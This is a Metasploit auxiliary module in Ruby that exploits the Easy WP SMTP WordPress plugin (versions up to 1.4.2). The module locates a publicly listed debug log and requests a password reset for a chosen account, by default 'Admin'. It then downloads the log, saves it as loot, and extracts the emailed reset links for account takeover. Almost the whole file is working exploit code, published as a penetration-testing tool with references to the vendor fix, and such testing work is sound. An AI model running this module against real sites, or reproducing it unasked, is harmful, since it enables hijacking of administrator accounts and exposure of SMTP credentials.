##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HTTP::Wordpress
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'WordPress Easy WP SMTP password reset',
        'Description' => %q{
          Wordpress plugin Easy WP SMTP versions <= 1.4.2 was found to not include index.html within its plugin folder.
          This potentially allows for directory listings.  If debug mode is also enabled for the plugin, all SMTP
          commands are stored in a debug file.
          Combining these items, it's possible to request a password reset for an account, then view the debug file to determine
          the link that was emailed out, and reset the user's password.
        },
        'Author' =>
          [
            'h00die', # msf module
            # this was an 0day
          ],
        'License' => MSF_LICENSE,
        'References' =>
          [
            ['URL', 'https://wordpress.org/support/topic/security-issue-with-debug-log/'],
            ['URL', 'https://blog.nintechnet.com/wordpress-easy-wp-smtp-plugin-fixed-zero-day-vulnerability/'],
            ['URL', 'https://plugins.trac.wordpress.org/changeset/2432768/easy-wp-smtp']
          ],
        'DisclosureDate' => '2020-12-06'
      )
    )
    register_options [
      OptString.new('USER', [false, 'Username to reset the password for', 'Admin'])
    ]
  end

  def run_host(ip)
    unless wordpress_and_online?
      fail_with Failure::NotVulnerable, 'Server not online or not detected as wordpress'
    end

    checkcode = check_plugin_version_from_readme('easy-wp-smtp', '1.4.2')
    unless [Msf::Exploit::CheckCode::Vulnerable, Msf::Exploit::CheckCode::Appears, Msf::Exploit::CheckCode::Detected].include?(checkcode)
      fail_with Failure::NotVulnerable, 'Easy WP SMTP'
    end
    print_good('Vulnerable version detected')

    res = send_request_cgi({
      'method' => 'GET',
      'uri' => "#{normalize_uri(target_uri.path, 'wp-content', 'plugins', 'easy-wp-smtp')}/" # trailing / to browse directory
    })
    fail_with Failure::Unreachable, 'Connection failed' unless res
    # find the debug file name, prefix during my testing was 14 alpha-numeric
    unless />(?<debug_log>\w{5,15}_debug_log\.txt)/ =~ res.body
      fail_with Failure::NotVulnerable, 'Either debug log not turned on, or directory listings disabled'
    end

    print_good("Found debug log: #{normalize_uri(target_uri.path, 'wp-content', 'plugins', 'easy-wp-smtp', debug_log)}")
    print_status("Sending password reset for #{datastore['USER']}")
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'wp-login.php'),
      'vars_get' => {
        'action' => 'lostpassword'
      },
      'vars_post' => {
        'user_login' => datastore['USER'],
        'redirect_to' => '',
        'wp-submit' => 'Get New Password'
      }
    })
    fail_with Failure::Unreachable, 'Connection failed' unless res
    fail_with Failure::NotVulnerable, 'Site not configured to submit new password request' if res.body.include?('The email could not be sent')
    fail_with Failure::Unknown, 'Unable to submit new password request' unless res.code == 302
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'wp-content', 'plugins', 'easy-wp-smtp', debug_log)
    })
    loot = store_loot(debug_log, 'text/plain', ip, res.body)
    print_good("Debug log saved to #{loot}.  Manual review for possible SMTP password, and other information.")
    c2s = 'CLIENT -> SERVER:\s+'
    # this is an ugly regex, but the username, and link span multiple lines
    res.body.scan(/#{c2s}Username: (?<username>\w+)\s+#{c2s}#{c2s}If this was a mistake, just ignore this email and nothing will happen.\s+#{c2s}#{c2s}To reset your password, visit the following address:\s+#{c2s}#{c2s}(?<link>[^\n]+)/).each do |match|
      if datastore['USER'] == match[0]
        print_good("#{match[0]} password reset: #{match[1]}")
        next
      end
      print_status("#{match[0]} password reset: #{match[1]}")
    end
    print_status('Finished enumerating resets.  Last one most likely to succeed')
  end
end
